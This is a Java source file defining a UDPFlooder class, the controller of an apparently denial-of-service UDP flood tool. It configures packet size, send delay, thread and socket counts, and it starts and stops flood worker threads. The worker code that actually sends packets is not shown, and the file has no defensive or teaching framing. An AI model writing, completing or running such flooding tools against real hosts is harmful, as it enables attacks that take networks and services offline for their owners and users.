package com.protolinux;

import java.util.ArrayList;

public class UDPFlooder {

    public boolean isRandom     = false;
    public int pkt_size_kb      = 10;
    public int delay_ms         = 10;
    public int threads          = 1;
    public int socks_per_thread = 1;
    public long data_sent       = 0;

    public ArrayList<FloodThread> thread_list;

    public UDPFlooder() {
        thread_list = new ArrayList<FloodThread>();
    }

    /* Start flood threads */
    public void start(Object[] args) {
        data_sent = 0; // reset counter

        try {
            int x;
            for (x=0; x < threads; x++) {
                FloodThread fthread = new FloodThread(args);
                fthread.set_parent( this );
                thread_list.add( fthread );

                Thread new_thread = new Thread( fthread );
                new_thread.setDaemon(true);
                new_thread.start();
            }
        } catch (Exception e) { log(e.getMessage()); }
    }

    /* Stop all Floodthreads */
    public void stop() {
        try {
            for (FloodThread ft : thread_list) {
                ft.__terminate__();
            }
            thread_list.clear();
        } catch (Exception e) { log(e.getMessage()); }
    }

    /* For debugging */
    public void log(Object s) {
        System.out.print( s );
        System.out.print("\n");
    }
}
